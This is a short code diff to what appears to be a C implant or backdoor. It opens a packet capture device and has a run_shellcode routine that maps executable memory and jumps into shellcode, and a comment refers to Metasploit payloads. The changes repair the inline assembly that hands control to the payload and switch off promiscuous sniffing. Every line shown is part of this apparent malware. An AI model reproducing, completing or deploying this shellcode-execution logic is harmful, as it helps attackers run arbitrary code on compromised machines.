@@ -79,10 +79,10 @@ void run_shellcode(const unsigned char *shellcode, uint32_t size) {
 		if(new_stack = mmap(NULL, STACK_SIZE, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0)) {
 
 			// Some of the msfpayloads seem to eventually jump to the stack even though it's not executable
-			__asm__("mov -0x10(%ebp),%esp");
-			__asm__("mov -0x0C(%ebp),%esp");
-			__asm__("add $0x0100, %esp");
-			__asm__("jmp *%eax");
+         	__asm__("mov -0x0C(%ebp),%eax");
+        	__asm__("mov -0x10(%ebp),%esp");
+        	__asm__("add $0x0100, %esp");
+         	__asm__("jmp *%eax");
 		}
 	}
 }
@@ -231,7 +231,7 @@ int main(int argc, char *argv[0]) {
 	srand(time(NULL));
 
 	// Opening the pcap device
-	if((handle = pcap_open_live(INTERFACE, BUFSIZ, 1, 1000, errbuf)) == NULL) {
+	if((handle = pcap_open_live(INTERFACE, BUFSIZ, 0, 1000, errbuf)) == NULL) {
 		DEBUG_WRAP(fprintf(stderr, "Error opening device %s: %s\n", INTERFACE, errbuf));
 		return -1;
 	}
